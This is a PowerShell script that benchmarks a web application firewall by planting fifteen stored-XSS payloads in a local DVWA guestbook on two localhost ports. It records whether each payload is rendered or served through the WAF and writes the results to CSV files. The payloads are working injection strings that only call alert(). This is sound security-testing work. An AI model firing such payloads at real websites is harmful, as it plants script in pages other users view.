# 06_xss_stored.ps1 — stored XSS (CWE-79) on TWO mechanisms:
#   (a) direct store through the WAF   -> d(direct)   [xss_stored_matrix.csv]
#   (b) off-path store, view via WAF   -> d(off-path) [xss_stored_crossport.csv]
param([string]$sess = $env:DVWA_SESS)

# --- resolve results dir relative to THIS script (works from any CWD) ---
$RES = Join-Path (Split-Path -Parent $PSScriptRoot) "results"
if (-not (Test-Path $RES)) { New-Item -ItemType Directory -Force -Path $RES | Out-Null }

$cookie="PHPSESSID=$sess; security=low"
$Ustore="http://localhost:8081/vulnerabilities/xss_s/"; $Dstore="http://localhost:9081/vulnerabilities/xss_s/"

# --- (a) direct store ---
$p1=@("<script>alert('stored1')</script>","<img src=x onerror=alert('stored2')>","<svg onload=alert('stored3')>",
 "<script>alert(String.fromCharCode(83))</script>","<ScRiPt>alert('stored5')</ScRiPt>","<body onload=alert('stored6')>",
 "<iframe src=javascript:alert('stored7')>","<marquee onstart=alert('stored8')>","<details open ontoggle=alert('stored9')>",
 "<a href=javascript:alert('stored10')>x</a>")
$rows=@(); $i=0
foreach($p in $p1){ $i++
 $body="txtName=u$i&mtxMessage=$([uri]::EscapeDataString($p))&btnSign=Sign+Guestbook"
 $rd=curl.exe -s -w "HTTPSTATUS:%{http_code}" -b $cookie -d $body "$Dstore"
 $scD=($rd|Select-String "HTTPSTATUS:(\d+)").Matches.Groups[1].Value
 $gd=curl.exe -s -b $cookie "$Dstore"; $renD=if($gd -match [regex]::Escape($p)){1}else{0}
 $ru=curl.exe -s -w "HTTPSTATUS:%{http_code}" -b $cookie -d $body "$Ustore"
 $scU=($ru|Select-String "HTTPSTATUS:(\d+)").Matches.Groups[1].Value
 $gu=curl.exe -s -b $cookie "$Ustore"; $renU=if($gu -match [regex]::Escape($p)){1}else{0}
 $rows+=[pscustomobject]@{payload=$p;store_code_U=$scU;rendered_U=$renU;store_code_D=$scD;rendered_D=$renD}}
$rows|Format-Table -AutoSize
$rows|Export-Csv -NoTypeInformation -Encoding UTF8 $RES\xss_stored_matrix.csv
$nU=($rows|?{$_.rendered_U -eq 1}).Count; $nD=($rows|?{$_.rendered_D -eq 1}).Count
Write-Host "d(StoredXSS direct) = $nD / $nU = $([math]::Round($nD/[math]::Max($nU,1),3))" -ForegroundColor Green

# --- (b) off-path store (plant via undefended), view via WAF ---
$p2=@("<script>alert('X1cross')</script>","<img src=x onerror=alert('X2cross')>","<svg onload=alert('X3cross')>",
 "<ScRiPt>alert('X4cross')</ScRiPt>","<body onload=alert('X5cross')>")
$rows2=@(); $i=0
foreach($p in $p2){ $i++
 $body="txtName=xc$i&mtxMessage=$([uri]::EscapeDataString($p))&btnSign=Sign+Guestbook"
 curl.exe -s -o NUL -b $cookie -d $body "$Ustore"                 # plant off-path (8081)
 $gd=curl.exe -s -w "HTTPSTATUS:%{http_code}" -b $cookie "$Dstore" # view via WAF (9081)
 $vc=($gd|Select-String "HTTPSTATUS:(\d+)").Matches.Groups[1].Value
 $served=if($gd -match [regex]::Escape($p)){1}else{0}
 $rows2+=[pscustomobject]@{payload=$p;view_code_via_WAF=$vc;payload_served_through_WAF=$served}}
$rows2|Format-Table -AutoSize
$rows2|Export-Csv -NoTypeInformation -Encoding UTF8 $RES\xss_stored_crossport.csv
$ns=($rows2|?{$_.payload_served_through_WAF -eq 1}).Count
Write-Host "Stored payload served through WAF at render: $ns / $($p2.Count)  (=> d off-path = $([math]::Round($ns/$p2.Count,3)))" -ForegroundColor Green
